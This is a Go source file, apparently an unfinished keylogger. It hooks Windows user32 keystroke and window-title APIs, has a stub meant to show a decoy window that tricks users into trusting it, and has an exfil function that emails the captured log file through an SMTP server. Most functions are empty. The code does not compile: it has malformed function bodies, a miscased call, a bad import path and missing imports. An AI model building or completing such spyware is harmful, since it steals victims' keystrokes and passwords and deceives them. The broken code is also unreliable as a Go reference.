package main

import (
	"fmt"
	"net/smtp"
	"os"
	"unsafe"
	"syscall"
	"time"
	"github/TheTitanrain/w32"
)

var (
	// windows
	user32 = syscall.NewLazyDll("user32.dll")
	procGetForegroundWindow = user32.NewProc("GetForegroundWindow") // get the foreground win api
	procGetWindowTitle = user32.NewProc("GetWindowTextW") // get the process title
	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")

	tempKeylog string
	tempTitle string

	// linux


)

func main() (
	// setup go routines for the program to run
	go keylogging() // log the keystrokes
	// these are only going to work on windows for now
	// log the current forground window and title
	go GetWindowTitle() 
	go GetActiveWindow()
	go exfil() // every time interval need to send the log file and other logged data
)

// create a window on startup to trick the user 
// into thinking its safe software
func startingWindow() (

)

// get the active foreground
func GetActiveWindow() (
	// log the active forground this should be in the same log file as keystrokes

)

// get the window title 
func GetWindowTitle() (
	// log the window title on windows

)

// get keystrokes
func keylogging() (
	// need to log the keys based on OS and log to file

)

func exfil() (
	// need to create a way to exfil data besides keystrokes
	m := email.NewMessage("venivici")
	m.From = "from@example.com" // need to convert to env variables if possible
	m.To = []string{"to@example.com"} // the test email account

	err := m.Attach("notes.txt") // the log file
	if err != nil {
		log.Println(err)
	}

	// change to email other than google
	err = email.Send("smtp.gmail.com:587", smtp.PlainAuth("", "user", "password", "smtp.gmail.com"), m)
)
